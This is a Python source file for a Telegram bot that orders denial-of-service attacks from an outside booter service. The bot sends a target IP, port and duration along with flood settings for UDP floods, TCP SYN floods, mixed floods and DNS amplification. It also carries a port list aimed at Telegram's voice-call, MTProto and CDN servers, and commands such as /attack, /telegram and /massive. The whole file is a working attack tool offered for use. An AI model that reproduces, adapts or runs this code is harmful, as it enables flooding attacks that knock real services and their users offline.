# app.py - MAXIMUM POWER VERSION
import os
import logging
import asyncio
import threading
import aiohttp
import time
import random
from datetime import datetime, timedelta
from flask import Flask, jsonify
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, 
    CommandHandler, 
    CallbackQueryHandler, 
    MessageHandler, 
    filters, 
    ContextTypes
)
from dotenv import load_dotenv

load_dotenv()

# ===== CONFIGURATION =====
TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
API_KEY = os.getenv("API_KEY")
OWNER_ID = int(os.getenv("OWNER_ID", "123456789"))
PORT = int(os.getenv("PORT", 8080))
MAX_CONCURRENT = 5  # Increased to 5

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ===== FLASK APP =====
flask_app = Flask(__name__)

@flask_app.route('/')
def index():
    return "🤖 Attack Bot is Running!"

@flask_app.route('/health')
def health():
    return jsonify({"status": "healthy", "timestamp": datetime.now().isoformat()})

# ===== TELEGRAM PORTS =====
TELEGRAM_PORTS = {
    "voip": [32001, 32002, 32003, 32004, 32005, 3478, 3479, 3480, 3481, 3482],
    "mtproto": [443, 80, 5222, 5223, 5224, 5225, 5226, 5227],
    "cdn": [443, 80, 8080, 8443, 8880, 8881]
}

ALL_PORTS = sorted(list(set(TELEGRAM_PORTS["voip"] + TELEGRAM_PORTS["mtproto"] + TELEGRAM_PORTS["cdn"])))

# ===== ATTACK MANAGER =====
class AttackManager:
    def __init__(self):
        self.active_attacks = {}
        self.attack_counter = 0
        self.lock = threading.Lock()
        self.attack_logs = []
        self.total_attacks = 0
        self.concurrent_busy = 0
    
    def can_start_attack(self, user_id):
        with self.lock:
            user_attacks = sum(1 for a in self.active_attacks.values() if a['user_id'] == user_id)
            if user_attacks >= MAX_CONCURRENT:
                return False, f"❌ Concurrent busy: {user_attacks}/{MAX_CONCURRENT}"
            if len(self.active_attacks) >= 50:
                return False, "❌ Too many active attacks globally."
            return True, "OK"
    
    def start_attack(self, user_id, target, port, duration, method, attack_type="single"):
        with self.lock:
            self.attack_counter += 1
            attack_id = self.attack_counter
            self.total_attacks += 1
            self.concurrent_busy = len(self.active_attacks) + 1
            self.active_attacks[attack_id] = {
                'id': attack_id,
                'user_id': user_id,
                'target': target,
                'port': port,
                'duration': duration,
                'method': method,
                'attack_type': attack_type,
                'start_time': datetime.now(),
                'status': 'running'
            }
            return attack_id
    
    def stop_attack(self, attack_id):
        with self.lock:
            if attack_id in self.active_attacks:
                self.active_attacks[attack_id]['status'] = 'stopped'
                self.concurrent_busy = max(0, self.concurrent_busy - 1)
                return True
            return False
    
    def get_active_attacks(self, user_id=None):
        with self.lock:
            if user_id:
                return {aid: att for aid, att in self.active_attacks.items() if att['user_id'] == user_id and att['status'] == 'running'}
            return {aid: att for aid, att in self.active_attacks.items() if att['status'] == 'running'}
    
    def get_stats(self):
        with self.lock:
            active = len([a for a in self.active_attacks.values() if a['status'] == 'running'])
            return {
                'active': active,
                'concurrent_busy': self.concurrent_busy,
                'total': self.total_attacks,
                'max': MAX_CONCURRENT
            }
    
    def log_attack(self, user_id, target, port, duration, method, status, response):
        self.attack_logs.append({
            'user_id': user_id,
            'target': target,
            'port': port,
            'duration': duration,
            'method': method,
            'status': status,
            'response': response[:500],
            'timestamp': datetime.now()
        })
    
    def cleanup(self):
        with self.lock:
            now = datetime.now()
            to_remove = []
            for aid, att in self.active_attacks.items():
                if att['status'] == 'stopped':
                    to_remove.append(aid)
                elif (now - att['start_time']).seconds > att['duration'] + 15:
                    to_remove.append(aid)
            for aid in to_remove:
                del self.active_attacks[aid]
                self.concurrent_busy = max(0, self.concurrent_busy - 1)

attack_manager = AttackManager()

# ===== MAXIMUM POWER ATTACK =====
async def send_massive_attack(target, port, duration, method, intensity="max"):
    """Send maximum power attack with multiple methods"""
    url = "https://api.susstresser.com/panel/api/api.php"
    
    # Different attack methods for maximum impact
    methods_to_try = [
        # UDP Flood - Maximum packets
        {
            "key": API_KEY,
            "host": target,
            "port": port,
            "time": duration,
            "method": "UDP",
            "threads": 5000,
            "pps": 5000000,
            "bps": 5000000000,
            "size": 65500,
            "random": "true",
            "timeout": 1
        },
        # UDP Flood - Large packets
        {
            "key": API_KEY,
            "host": target,
            "port": port,
            "time": duration,
            "method": "UDP",
            "threads": 3000,
            "pps": 3000000,
            "bps": 3000000000,
            "size": 1500,
            "random": "false"
        },
        # Mixed attack
        {
            "key": API_KEY,
            "host": target,
            "port": port,
            "time": duration,
            "method": "MIX",
            "threads": 4000,
            "pps": 4000000,
            "type": "all"
        },
        # TCP SYN flood
        {
            "key": API_KEY,
            "host": target,
            "port": port,
            "time": duration,
            "method": "TCP",
            "threads": 2000,
            "pps": 2000000,
            "syn": "true"
        },
        # Amplification attack
        {
            "key": API_KEY,
            "host": target,
            "port": port,
            "time": duration,
            "method": "UDP",
            "threads": 1500,
            "pps": 1500000,
            "amplification": "true",
            "type": "dns"
        }
    ]
    
    results = []
    success_count = 0
    
    for i, config in enumerate(methods_to_try[:3]):  # Try first 3 for speed
        try:
            timeout = aiohttp.ClientTimeout(total=duration + 20)
            async with aiohttp.ClientSession(timeout=timeout) as session:
                start_time = time.time()
                async with session.get(url, params=config) as response:
                    elapsed = time.time() - start_time
                    result_text = await response.text()
                    
                    is_success = response.status == 200 and ("SUCCESS" in result_text or "sent" in result_text.lower())
                    if is_success:
                        success_count += 1
                    
                    results.append({
                        'method': config.get('method', 'UDP'),
                        'status': response.status,
                        'elapsed': f"{elapsed:.2f}s",
                        'success': is_success,
                        'response': result_text[:200]
                    })
                    
                    logger.info(f"Attack {i+1}: Status {response.status}, Time: {elapsed:.2f}s")
                    await asyncio.sleep(0.3)  # Small delay between attacks
                    
        except Exception as e:
            logger.error(f"Attack {i+1} failed: {e}")
            results.append({
                'method': config.get('method', 'UDP'),
                'success': False,
                'error': str(e)
            })
    
    return {
        "success": success_count > 0,
        "attempts": success_count,
        "total_attempts": len(results),
        "results": results,
        "target": target,
        "port": port,
        "duration": duration,
        "summary": f"✅ {success_count}/{len(results)} attacks sent to {target}:{port}"
    }

async def send_multi_port_attack(target, ports, duration, method):
    """Attack multiple ports simultaneously"""
    url = "https://api.susstresser.com/panel/api/api.php"
    
    results = []
    success_count = 0
    
    # Send attacks to all ports
    for port in ports:
        config = {
            "key": API_KEY,
            "host": target,
            "port": port,
            "time": duration,
            "method": method.upper(),
            "threads": 3000,
            "pps": 3000000,
            "bps": 3000000000,
            "size": 65500,
            "random": "true"
        }
        
        try:
            timeout = aiohttp.ClientTimeout(total=duration + 15)
            async with aiohttp.ClientSession(timeout=timeout) as session:
                async with session.get(url, params=config) as response:
                    result_text = await response.text()
                    is_success = response.status == 200 and "SUCCESS" in result_text
                    if is_success:
                        success_count += 1
                    results.append({
                        'port': port,
                        'success': is_success,
                        'status': response.status
                    })
                    await asyncio.sleep(0.2)
        except Exception as e:
            results.append({'port': port, 'success': False, 'error': str(e)})
    
    return {
        "success": success_count > 0,
        "successful_ports": success_count,
        "total_ports": len(ports),
        "results": results,
        "summary": f"✅ {success_count}/{len(ports)} ports attacked on {target}"
    }

# ===== BOT HANDLERS =====
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    stats = attack_manager.get_stats()
    
    keyboard = [
        [InlineKeyboardButton("💥 ATTACK", callback_data="attack")],
        [InlineKeyboardButton("🎯 TELEGRAM VC", callback_data="telegram_vc")],
        [InlineKeyboardButton("🔥 MASSIVE", callback_data="massive")],
        [InlineKeyboardButton("📊 ACTIVE", callback_data="active")],
        [InlineKeyboardButton("👤 MY INFO", callback_data="info")]
    ]
    
    if update.effective_user.id == OWNER_ID:
        keyboard.append([InlineKeyboardButton("⚙️ ADMIN", callback_data="admin")])
    
    await update.message.reply_text(
        f"⚡ *MAXIMUM POWER ATTACK BOT*\n\n"
        f"🔥 Status: ONLINE\n"
        f"⚡ Concurrent: {stats['concurrent_busy']}/{stats['max']}\n"
        f"📊 Total Attacks: {stats['total']}\n\n"
        f"🎯 *Commands:*\n"
        f"/attack IP PORT DURATION\n"
        f"/telegram IP DURATION\n"
        f"/massive IP DURATION\n"
        f"/status - Check status\n\n"
        f"Example: `/telegram 91.108.17.5 60`\n"
        f"This attacks ALL Telegram ports simultaneously!",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def massive_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Massive attack on all ports"""
    user_id = update.effective_user.id
    
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Only admin can use this.")
        return
    
    args = context.args
    if len(args) < 2:
        await update.message.reply_text(
            "❌ *Usage:* `/massive IP DURATION`\n\n"
            "This attacks ALL known Telegram ports!\n"
            f"Total ports: {len(ALL_PORTS)}\n"
            "Example: `/massive 91.108.17.5 60`",
            parse_mode='Markdown'
        )
        return
    
    try:
        target = args[0]
        duration = int(args[1])
        
        if duration < 60 or duration > 300:
            await update.message.reply_text("❌ Duration must be 60-300 seconds!")
            return
        
        can_start, msg = attack_manager.can_start_attack(user_id)
        if not can_start:
            await update.message.reply_text(msg)
            return
        
        status_msg = await update.message.reply_text(
            f"🔥 *MASSIVE ATTACK STARTED*\n\n"
            f"🎯 Target: `{target}`\n"
            f"📡 Attacking {len(ALL_PORTS)} ports\n"
            f"⏱️ Duration: {duration}s\n"
            f"⚡ Power: MAXIMUM\n"
            f"📊 Concurrent: {attack_manager.concurrent_busy}/{MAX_CONCURRENT}\n\n"
            f"⏳ Launching attacks...",
            parse_mode='Markdown'
        )
        
        # Attack all ports
        result = await send_multi_port_attack(target, ALL_PORTS[:10], duration, "UDP")
        
        response_text = (
            f"✅ *MASSIVE ATTACK COMPLETE*\n\n"
            f"🎯 Target: `{target}`\n"
            f"⏱️ Duration: {duration}s\n"
            f"📡 Ports: {result['successful_ports']}/{result['total_ports']} attacked\n\n"
            f"📊 *Port Results:*\n"
        )
        
        for r in result['results']:
            status = "✅" if r.get('success') else "❌"
            response_text += f"{status} Port {r['port']}\n"
        
        await status_msg.edit_text(response_text, parse_mode='Markdown')
        
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

async def telegram_vc_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Attack Telegram VC ports"""
    user_id = update.effective_user.id
    
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Only admin can use this.")
        return
    
    args = context.args
    if len(args) < 2:
        await update.message.reply_text(
            "❌ *Usage:* `/telegram IP DURATION`\n\n"
            f"Attacks Telegram voice ports: {', '.join(map(str, TELEGRAM_PORTS['voip']))}\n"
            "Example: `/telegram 91.108.17.5 60`",
            parse_mode='Markdown'
        )
        return
    
    try:
        target = args[0]
        duration = int(args[1])
        
        if duration < 60 or duration > 300:
            await update.message.reply_text("❌ Duration must be 60-300 seconds!")
            return
        
        can_start, msg = attack_manager.can_start_attack(user_id)
        if not can_start:
            await update.message.reply_text(msg)
            return
        
        ports = TELEGRAM_PORTS['voip']
        status_msg = await update.message.reply_text(
            f"🎯 *TELEGRAM VC ATTACK*\n\n"
            f"Target: `{target}`\n"
            f"Ports: {len(ports)}\n"
            f"Duration: {duration}s\n"
            f"Concurrent: {attack_manager.concurrent_busy}/{MAX_CONCURRENT}\n\n"
            f"⏳ Attacking...",
            parse_mode='Markdown'
        )
        
        # Attack each port
        results = []
        for port in ports:
            attack_id = attack_manager.start_attack(user_id, target, port, duration, "UDP", "telegram_vc")
            result = await send_massive_attack(target, port, duration, "UDP")
            results.append({'port': port, 'success': result.get('success', False)})
            attack_manager.stop_attack(attack_id)
            await asyncio.sleep(0.3)
        
        success = sum(1 for r in results if r['success'])
        
        await status_msg.edit_text(
            f"✅ *TELEGRAM VC ATTACK COMPLETE*\n\n"
            f"🎯 Target: `{target}`\n"
            f"📡 Ports: {success}/{len(ports)} successful\n"
            f"⏱️ Duration: {duration}s\n"
            f"⚡ Status: {'ACTIVE' if success > 0 else 'FAILED'}",
            parse_mode='Markdown'
        )
        
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Only admin can use /attack.")
        return
    
    args = context.args
    if len(args) < 3:
        await update.message.reply_text(
            "❌ *Usage:* `/attack IP PORT DURATION`\n\n"
            "Example: `/attack 91.108.17.5 32001 60`",
            parse_mode='Markdown'
        )
        return
    
    try:
        target = args[0]
        port = int(args[1])
        duration = int(args[2])
        
        if duration < 60 or duration > 300:
            await update.message.reply_text("❌ Duration must be 60-300 seconds!")
            return
        
        can_start, msg = attack_manager.can_start_attack(user_id)
        if not can_start:
            await update.message.reply_text(msg)
            return
        
        status_msg = await update.message.reply_text(
            f"🚀 Attacking {target}:{port} for {duration}s...\n"
            f"Concurrent: {attack_manager.concurrent_busy}/{MAX_CONCURRENT}"
        )
        
        attack_id = attack_manager.start_attack(user_id, target, port, duration, "UDP")
        result = await send_massive_attack(target, port, duration, "UDP")
        
        response = (
            f"✅ *ATTACK COMPLETED*\n\n"
            f"🎯 Target: `{target}:{port}`\n"
            f"⏱️ Duration: {duration}s\n"
            f"📊 Attack ID: `{attack_id}`\n"
            f"⚡ Status: {'✅ SUCCESS' if result.get('success') else '❌ PARTIAL'}\n\n"
            f"📡 {result.get('summary', 'N/A')}"
        )
        
        await status_msg.edit_text(response, parse_mode='Markdown')
        attack_manager.stop_attack(attack_id)
        attack_manager.cleanup()
        
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    stats = attack_manager.get_stats()
    active = attack_manager.get_active_attacks()
    
    await update.message.reply_text(
        f"📊 *BOT STATUS*\n\n"
        f"⚡ Active Attacks: {stats['active']}\n"
        f"📊 Concurrent: {stats['concurrent_busy']}/{stats['max']}\n"
        f"📈 Total Attacks: {stats['total']}\n"
        f"🔑 API: {'✅ Connected' if API_KEY else '❌ No Key'}\n"
        f"🌐 Status: ONLINE\n\n"
        f"🎯 Telegram VC Ports:\n{', '.join(map(str, TELEGRAM_PORTS['voip'][:5]))}...",
        parse_mode='Markdown'
    )

async def attack_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    keyboard = [
        [InlineKeyboardButton("🎯 UDP", callback_data="method_udp")],
        [InlineKeyboardButton("🔥 MIX", callback_data="method_mix")],
        [InlineKeyboardButton("🎯 TELEGRAM VC", callback_data="telegram_vc")],
        [InlineKeyboardButton("🔥 MASSIVE", callback_data="massive")],
        [InlineKeyboardButton("🔙 BACK", callback_data="back")]
    ]
    
    await query.edit_message_text(
        "💥 *SELECT ATTACK METHOD*\n\n"
        "UDP - Layer 4 Flood\n"
        "MIX - Combined Attack\n"
        "TELEGRAM VC - All Voice Ports\n"
        "MASSIVE - All Known Ports",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def method_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    method = query.data.split('_')[1]
    context.user_data['attack_method'] = method
    
    await query.edit_message_text(
        f"⚔️ *{method.upper()} ATTACK*\n\n"
        "Send: `IP PORT DURATION`\n"
        "Example: `91.108.17.5 32001 60`\n\n"
        "Duration: 60-300 seconds",
        parse_mode='Markdown'
    )
    context.user_data['awaiting_attack'] = True

async def process_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('awaiting_attack'):
        return
    
    user_id = update.effective_user.id
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Only admin can attack.")
        context.user_data['awaiting_attack'] = False
        return
    
    try:
        parts = update.message.text.split()
        target = parts[0]
        port = int(parts[1])
        duration = int(parts[2])
        method = context.user_data.get('attack_method', 'udp')
        
        if duration < 60 or duration > 300:
            await update.message.reply_text("❌ Duration must be 60-300 seconds!")
            return
        
        can_start, msg = attack_manager.can_start_attack(user_id)
        if not can_start:
            await update.message.reply_text(msg)
            context.user_data['awaiting_attack'] = False
            return
        
        status_msg = await update.message.reply_text(
            f"🚀 Attacking {target}:{port} for {duration}s..."
        )
        
        attack_id = attack_manager.start_attack(user_id, target, port, duration, method)
        result = await send_massive_attack(target, port, duration, method)
        
        await status_msg.edit_text(
            f"✅ *ATTACK COMPLETED*\n\n"
            f"🎯 Target: `{target}:{port}`\n"
            f"⏱️ Duration: {duration}s\n"
            f"📊 Attack ID: `{attack_id}`\n"
            f"⚡ Status: {'✅ SUCCESS' if result.get('success') else '❌ PARTIAL'}\n\n"
            f"📡 {result.get('summary', 'N/A')}",
            parse_mode='Markdown'
        )
        
        attack_manager.stop_attack(attack_id)
        attack_manager.cleanup()
        
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")
    
    context.user_data['awaiting_attack'] = False

async def massive_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Massive attack from button"""
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        "🔥 *MASSIVE ATTACK*\n\n"
        "Send: `IP DURATION`\n"
        f"Example: `91.108.17.5 60`\n\n"
        f"This attacks ALL {len(ALL_PORTS)} known Telegram ports!",
        parse_mode='Markdown'
    )
    context.user_data['awaiting_massive'] = True

async def process_massive(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('awaiting_massive'):
        return
    
    user_id = update.effective_user.id
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Only admin can attack.")
        context.user_data['awaiting_massive'] = False
        return
    
    try:
        parts = update.message.text.split()
        target = parts[0]
        duration = int(parts[1])
        
        if duration < 60 or duration > 300:
            await update.message.reply_text("❌ Duration must be 60-300 seconds!")
            return
        
        can_start, msg = attack_manager.can_start_attack(user_id)
        if not can_start:
            await update.message.reply_text(msg)
            context.user_data['awaiting_massive'] = False
            return
        
        status_msg = await update.message.reply_text(
            f"🔥 MASSIVE attack on {target} for {duration}s..."
        )
        
        result = await send_multi_port_attack(target, ALL_PORTS[:10], duration, "UDP")
        
        await status_msg.edit_text(
            f"✅ *MASSIVE ATTACK COMPLETE*\n\n"
            f"🎯 Target: `{target}`\n"
            f"⏱️ Duration: {duration}s\n"
            f"📡 Ports: {result['successful_ports']}/{result['total_ports']}\n"
            f"⚡ Status: {'✅ SUCCESS' if result['success'] else '❌ PARTIAL'}",
            parse_mode='Markdown'
        )
        
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")
    
    context.user_data['awaiting_massive'] = False

async def telegram_vc_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        "🎯 *TELEGRAM VC ATTACK*\n\n"
        "Send: `IP DURATION`\n"
        f"Example: `91.108.17.5 60`\n\n"
        f"Attacks these ports: {', '.join(map(str, TELEGRAM_PORTS['voip'][:5]))}...",
        parse_mode='Markdown'
    )
    context.user_data['awaiting_telegram_vc'] = True

async def process_telegram_vc(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('awaiting_telegram_vc'):
        return
    
    user_id = update.effective_user.id
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Only admin can attack.")
        context.user_data['awaiting_telegram_vc'] = False
        return
    
    try:
        parts = update.message.text.split()
        target = parts[0]
        duration = int(parts[1])
        
        if duration < 60 or duration > 300:
            await update.message.reply_text("❌ Duration must be 60-300 seconds!")
            return
        
        can_start, msg = attack_manager.can_start_attack(user_id)
        if not can_start:
            await update.message.reply_text(msg)
            context.user_data['awaiting_telegram_vc'] = False
            return
        
        status_msg = await update.message.reply_text(
            f"🎯 Telegram VC attack on {target} for {duration}s..."
        )
        
        ports = TELEGRAM_PORTS['voip']
        results = []
        
        for port in ports:
            attack_id = attack_manager.start_attack(user_id, target, port, duration, "UDP", "telegram_vc")
            result = await send_massive_attack(target, port, duration, "UDP")
            results.append({'port': port, 'success': result.get('success', False)})
            attack_manager.stop_attack(attack_id)
        
        success = sum(1 for r in results if r['success'])
        
        await status_msg.edit_text(
            f"✅ *TELEGRAM VC ATTACK COMPLETE*\n\n"
            f"🎯 Target: `{target}`\n"
            f"⏱️ Duration: {duration}s\n"
            f"📡 Ports: {success}/{len(ports)}\n"
            f"⚡ Status: {'✅ SUCCESS' if success > 0 else '❌ FAILED'}",
            parse_mode='Markdown'
        )
        
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")
    
    context.user_data['awaiting_telegram_vc'] = False

async def active_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    active = attack_manager.get_active_attacks(query.from_user.id)
    stats = attack_manager.get_stats()
    
    if not active:
        text = f"📊 *NO ACTIVE ATTACKS*\n\nConcurrent: {stats['concurrent_busy']}/{stats['max']}"
    else:
        text = f"📊 *ACTIVE ATTACKS ({len(active)})*\nConcurrent: {stats['concurrent_busy']}/{stats['max']}\n\n"
        for aid, att in active.items():
            elapsed = (datetime.now() - att['start_time']).seconds
            remaining = max(0, att['duration'] - elapsed)
            text += f"🔹 ID: `{aid}` - {att['target']}:{att['port']} - {remaining}s left\n"
    
    keyboard = [[InlineKeyboardButton("🔙 BACK", callback_data="back")]]
    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

async def info_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        f"👤 *USER INFO*\n\n"
        f"🆔 ID: `{query.from_user.id}`\n"
        f"⭐ Level: {'ADMIN' if query.from_user.id == OWNER_ID else 'USER'}\n"
        f"⚡ Max Concurrent: {MAX_CONCURRENT}\n"
        f"📡 API: {'✅ Connected' if API_KEY else '❌ No Key'}\n\n"
        f"🎯 Ports attacked:\n"
        f"Voice: {', '.join(map(str, TELEGRAM_PORTS['voip'][:3]))}...",
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back")]])
    )

async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.from_user.id != OWNER_ID:
        await query.answer("Access denied!", show_alert=True)
        return
    
    keyboard = [
        [InlineKeyboardButton("📊 ACTIVE ATTACKS", callback_data="admin_active")],
        [InlineKeyboardButton("📈 STATS", callback_data="admin_stats")],
        [InlineKeyboardButton("🔙 BACK", callback_data="back")]
    ]
    
    await query.edit_message_text(
        "⚙️ *ADMIN PANEL*",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def admin_active(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    active = attack_manager.get_active_attacks()
    stats = attack_manager.get_stats()
    
    if not active:
        text = f"📊 *NO ACTIVE ATTACKS*\n\nConcurrent: {stats['concurrent_busy']}/{stats['max']}"
    else:
        text = f"📊 *ACTIVE ATTACKS ({len(active)})*\nConcurrent: {stats['concurrent_busy']}/{stats['max']}\n\n"
        for aid, att in active.items():
            elapsed = (datetime.now() - att['start_time']).seconds
            remaining = max(0, att['duration'] - elapsed)
            text += f"🔹 ID: `{aid}` - {att['target']}:{att['port']} - {remaining}s left\n"
    
    await query.edit_message_text(text, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="admin")]]))

async def admin_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    stats = attack_manager.get_stats()
    await query.edit_message_text(
        f"📈 *BOT STATISTICS*\n\n"
        f"⚡ Active Attacks: {stats['active']}\n"
        f"📊 Concurrent: {stats['concurrent_busy']}/{stats['max']}\n"
        f"📈 Total Attacks: {stats['total']}\n"
        f"🔑 API: {'✅ Connected' if API_KEY else '❌ No Key'}\n"
        f"🌐 Status: ONLINE\n\n"
        f"🎯 Total Ports: {len(ALL_PORTS)}",
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="admin")]])
    )

async def back_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    stats = attack_manager.get_stats()
    
    keyboard = [
        [InlineKeyboardButton("💥 ATTACK", callback_data="attack")],
        [InlineKeyboardButton("🎯 TELEGRAM VC", callback_data="telegram_vc")],
        [InlineKeyboardButton("🔥 MASSIVE", callback_data="massive")],
        [InlineKeyboardButton("📊 ACTIVE", callback_data="active")],
        [InlineKeyboardButton("👤 MY INFO", callback_data="info")]
    ]
    
    if query.from_user.id == OWNER_ID:
        keyboard.append([InlineKeyboardButton("⚙️ ADMIN", callback_data="admin")])
    
    await query.edit_message_text(
        f"⚡ *MAXIMUM POWER BOT*\n\n"
        f"📊 Concurrent: {stats['concurrent_busy']}/{stats['max']}\n"
        f"📈 Total: {stats['total']}\n"
        f"🌐 Status: ONLINE",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.clear()
    await update.message.reply_text("✅ Cancelled!")

# ===== RUN BOT =====
def run_bot():
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    app = Application.builder().token(TELEGRAM_TOKEN).build()
    
    # Commands
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("attack", attack_command))
    app.add_handler(CommandHandler("telegram", telegram_vc_command))
    app.add_handler(CommandHandler("massive", massive_command))
    app.add_handler(CommandHandler("status", status_command))
    app.add_handler(CommandHandler("cancel", cancel))
    
    # Callbacks
    app.add_handler(CallbackQueryHandler(attack_callback, pattern="^attack$"))
    app.add_handler(CallbackQueryHandler(method_callback, pattern="^method_"))
    app.add_handler(CallbackQueryHandler(telegram_vc_callback, pattern="^telegram_vc$"))
    app.add_handler(CallbackQueryHandler(massive_callback, pattern="^massive$"))
    app.add_handler(CallbackQueryHandler(active_callback, pattern="^active$"))
    app.add_handler(CallbackQueryHandler(info_callback, pattern="^info$"))
    app.add_handler(CallbackQueryHandler(admin_callback, pattern="^admin$"))
    app.add_handler(CallbackQueryHandler(admin_active, pattern="^admin_active$"))
    app.add_handler(CallbackQueryHandler(admin_stats, pattern="^admin_stats$"))
    app.add_handler(CallbackQueryHandler(back_callback, pattern="^back$"))
    
    # Messages
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, process_attack))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, process_telegram_vc))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, process_massive))
    
    loop.run_until_complete(app.initialize())
    loop.run_until_complete(app.start())
    loop.run_until_complete(app.updater.start_polling(allowed_updates=Update.ALL_TYPES))
    
    logger.info("✅ Bot started!")
    loop.run_forever()

if __name__ == "__main__":
    print("=" * 50)
    print("⚡ MAXIMUM POWER ATTACK BOT STARTING...")
    print("=" * 50)
    
    bot_thread = threading.Thread(target=run_bot, daemon=True)
    bot_thread.start()
    
    logger.info("✅ Bot thread started")
    flask_app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False)